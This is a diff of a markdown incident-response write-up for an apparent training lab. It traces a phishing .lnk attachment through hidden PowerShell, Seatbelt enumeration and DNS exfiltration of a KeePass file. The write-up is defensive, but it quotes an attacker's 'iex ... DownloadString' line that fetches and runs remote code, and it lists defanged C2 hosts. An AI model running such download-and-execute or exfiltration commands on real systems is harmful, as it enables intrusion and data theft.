@@ -12,8 +12,9 @@
 - Wireshark
 - Tshark
 - Thunderbird
+- CyberChef
 - Lnkparser3 
-- Linux command line tools such as awk, grep, sed, and base64
+- Linux command line tools such as awk, grep, and base64
 
 **Given Artifacts:**
 - copy of a phishing email (dump.eml)
@@ -21,10 +22,10 @@
 - Packet Capture From the same workstation (Capture.pcap)
 
 ***Goals:***
-- Gained familiarity in using Wireshark and TShark to determine if and to which extent is an particular endpoint compromised.  
-- Extract TTPs using Wireshark, TShark, and Linux command line tools.
-- Demonstrate experience in using Wireshark and TShark to find DNS exfiltration attempts.
-- Demonstrate skill and experience in analyzing a phishing email by analyzing headers and body of the email in the original HTML.
+- Gain familiarity in using Wireshark and TShark to determine if and to which extent is a particular endpoint compromised.  
+- Extract TTPs using Wireshark, TShark, and Thunderbird. 
+- Demonstrate experience in using Wireshark and TShark to investigate DNS exfiltration attempts.
+- Demonstrate skill and experience in analyzing a phishing email by analyzing headers and body of the email. 
 
 
 # Start of the Investigation 
@@ -43,13 +44,13 @@ Some details gathered:
 
 The attachment included in the suspicious email was identified as Invoice.zip. The full email, including the message body and email headers, was uploaded to a message header analysis tool to provide additional context surrounding the email and its origin.
 
-The attachment was extracted using Thunderbird, revealing an additional file named invoice_20230103.lnk. The email body contained a password required to decrypt/extract the contents of the attachment.
+The attachment was extracted using Thunderbird, revealing an additional file named *invoice_20230103.lnk*. The email body contained a password required to decrypt/extract the contents of the attachment.
 
-After extracting the .lnk file, LnkParse was used to analyze the shortcut and identify embedded command-line arguments:
+After extracting the .lnk file, Lnkparse was used to analyze the shortcut and identify embedded command-line arguments:
 
 ``lnkparse Invoice_20230103.lnk``
 
-Analysis of the LnkParse output revealed a suspicious command containing a Base64-encoded PowerShell payload. The presence of PowerShell execution with a hidden window and an encoded command is consistent with techniques commonly used to obfuscate malicious activity.
+Analysis of the Lnkparse output revealed a suspicious command containing a Base64-encoded PowerShell payload. The presence of PowerShell execution with a hidden window and an encoded command is consistent with techniques commonly used to obfuscate malicious activity.
 
 Observed command:
 
@@ -62,13 +63,13 @@ The encoded argument was decoded using CyberChef's Base64 decoder, followed by r
 **Findings**
 
 The decoded payload demonstrates several suspicious behaviors:
- - nop: Attempts to prevent PowerShell profiles from loading.
- - windowstyle hidden: Executes PowerShell with the window hidden from the user.
- - enc: Uses Base64 encoding to obfuscate the PowerShell command within the .lnk file.
- - iex: Invokes Invoke-Expression to execute the retrieved content.
- - Net.WebClient: Creates a web client used to retrieve content from a remote server.
- - DownloadString(): Downloads the contents of the specified URL directly into memory.
- - External URL: hxxp://files.bpakcaging[.]xyz/update
+ - *nop*: Attempts to prevent PowerShell profiles from loading.
+ - *windowstyle hidden*: Executes PowerShell with the window hidden from the user.
+ - *enc*: Uses Base64 encoding to obfuscate the PowerShell command within the .lnk file.
+ - *iex*: Invokes Invoke-Expression to execute the retrieved content.
+ - *Net.WebClient*: Creates a web client used to retrieve content from a remote server.
+ - *DownloadString()*: Downloads the contents of the specified URL directly into memory.
+ - *External URL*: hxxp://files.bpakcaging[.]xyz/update
 
 The combination of an email-delivered .lnk file, hidden PowerShell execution, Base64 obfuscation, and retrieval of a remote payload is highly suspicious and indicates that the shortcut was likely intended to serve as an initial execution mechanism for additional malicious code.
 
@@ -78,7 +79,7 @@ The combination of an email-delivered .lnk file, hidden PowerShell execution, Ba
 
 ### Task 2: Endpoint Security
 
-We now can conclude that the PowerShell command observed in the first task signaled initial execution and compromise of Julianne's workstation. Further actions along the kill chain are most likely after initial access. 
+We now can conclude that the PowerShell command observed in the first task was evidence of initial execution and the consequent compromise of Julianne's workstation. Actions further down the kill chain such as execution and exfiltration are most likely after initial access. 
 Our supervisor has given us an helpful investigative guide to follow for task 2.
 - Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
 - Since the given data is JSON, we can parse it in CLI using the jq command.
@@ -91,11 +92,11 @@ First thought process is to look for the suspicious domain found when we decoded
 **Findings**
 - The attacker reaches out to two likely Command and Control (C2) Servers: *cdn.bpakcaging.xyz && files.bpakcaging.xyz*.
 
-Next, Our supervisor instructs us to find the enumeration tool that the attacker downloads. My initial thought process is to narrow down the results by using the grepping for .downloadstring since we know our attacker uses this method for ingress tool transfer. Command: ```cat powershell.json | jq | grep -i "downloadstring"```
+Next, Our supervisor instructs us to find the enumeration tool that the attacker downloads. My initial thought process is to narrow down the results by using the grep to search for .downloadstring since we know our attacker uses this method for ingress tool transfer. Command: ```cat powershell.json | jq | grep -i "downloadstring"```
 
 **Findings**
 - We get an interesting result of ```"ScriptBlockText": "iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd"```
-- Nothing stood out at first for me, but I researched the GitHub repository in the command above, and found out eventually that the enumeration tool was the tool known as *Seatbelt*.
+- Nothing stood out at first for me, but I decided to researched the GitHub repository in the command above, finding out eventually that the enumeration tool was the tool known as *Seatbelt*.
 
   <img width="886" height="355" alt="image" src="https://github.com/user-attachments/assets/0b68d4c3-7211-4afa-a589-f30b5f8db5a1" />
 
@@ -105,12 +106,12 @@ I isolate the results to anything including the binary:
 The hint tell us to sort by timestamp in order to piece together the chain of events which should give us the answer, so I run the command ```cat poowershell.json | jq | grep -i "sq3.exe" | jq -s -c 'sort by(.Timestamp) | .[] | {ScriptBlockText}' | grep -v null | grep -v Set-StrickMode``` We clean up the noise by filtering out null and Set-StrictMode events.
 
  **Findings**
- - The command yields us a suspicous looking line ```{"ScriptBlockText":".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite```.
+ - The command yields us a suspicious looking line ```{"ScriptBlockText":".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite```.
  - That is part of the full file path for the file accessed by sq3.exe.
- - The other part is C:\Users\J.westcott to make the full path: ```C:\\Users\\J.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite```.
+ - The beginning part is C:\Users\J.westcott, which makes the full file path: ```C:\\Users\\J.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite```.
  - The file uses the software ```Microsoft Sticky Notes```.
  - Further down in the results, we see that a file ```protceted_data.kdbx``` is exfiltrated to the following location ```167[.]71[.]211[.]113```.
- - The full attack sequence is illustrated in the image below
+ - Most of the attack evidence is seen in the image below.
 
 <img width="1545" height="584" alt="image" src="https://github.com/user-attachments/assets/18d465dd-306b-49b0-b98a-1c15d3daac9d" />
 
@@ -138,11 +139,11 @@ We are given a list of artifacts to find by our supervisor.
 - **Answer: POST**
 
 
-*Question 3: What is the protocol used during the exfiltration activity?
+*Question 3: What is the protocol used during the exfiltration activity?*
 - We filter for all traffic outbound to 167[.]71[.]211[.]113. Scanning the results, straight away I see evidence of DNS exfiltration.
-- We have numerous queries with lengths greater than 60 as well as long subdomains and unusual query names.
-- The queries follow a beaconing type of behavior
-- **Answer: The most likely protocol is DNS, the signs are overwhelmingly present. 
+- We have numerous queries with lengths >60, as well as long subdomains with unusual query names.
+- The queries follow a beaconing pattern.
+- **Answer: The signs overwhelmingly point to exfiltration via DNS.** 
 
 <img width="1550" height="238" alt="image" src="https://github.com/user-attachments/assets/a3fbc478-0a77-46a6-a89b-d8b2dd8641c3" />
 
@@ -156,7 +157,7 @@ We are given a list of artifacts to find by our supervisor.
 
 <img width="1059" height="526" alt="image" src="https://github.com/user-attachments/assets/9235a645-d934-4094-9ef4-2fde1a735c33" />
 
-**Question 5: What is the credit card number stored inside the exfiltrated file?**
+*Question 5: What is the credit card number stored inside the exfiltrated file?*
 - We know that the threat actor used DNS to exfiltrate the file, so we need to reconstruct and extract the exfiltrated data. The hint indicates that this task is best completed using TShark.
 TShark is a command-line tool, so we will perform the analysis from the command line.
 First, we use TShark to extract all DNS queries to the suspicious domain, bpakcaging.xyz, which was identified as the C2 server.
@@ -176,4 +177,11 @@ After decoding the data, it reconstructed into a KeePass vault file. I then used
 
 <img width="1593" height="301" alt="image" src="https://github.com/user-attachments/assets/3ac35da4-d6d0-47dd-bee7-23228b63e8fb" />
 
+## Conclusion
+The investigation successfully traced the Boogeyman threat actor's activity from initial access through execution, discovery, collection, and exfiltration. The attack began with a phishing email containing a malicious *Invoice.zip* attachment. Analysis of the extracted .lnk file revealed an obfuscated PowerShell command that executed with a hidden window and downloaded additional content from the attacker-controlled infrastructure.
 
+Analysis of the PowerShell logs provided further insight into the attacker's post-compromise activity. The threat actor used the Seatbelt enumeration tool and subsequently used *sq3.exe* to access the victim's Microsoft Sticky Notes database, *plum.sqlite*. The investigation also identified a KeePass database, *protceted_data.kdbx*, that was ultimately exfiltrated to the attacker's infrastructure.
+
+Network analysis of the PCAP confirmed the attacker's infrastructure and demonstrated that DNS was used for data exfiltration. TShark was then used to isolate and reconstruct the DNS-based exfiltration traffic. After decoding the recovered data, the exfiltrated file was reconstructed as a KeePass vault. Using the password recovered during the investigation allowed the vault to be opened and the sensitive credit card information to be identified.
+
+Overall, this investigation demonstrated how phishing, PowerShell execution, encoded commands, system enumeration, database access, and DNS-based exfiltration can be correlated across email artifacts, endpoint logs, and network traffic to reconstruct an attacker's activity and determine the extent of compromise.
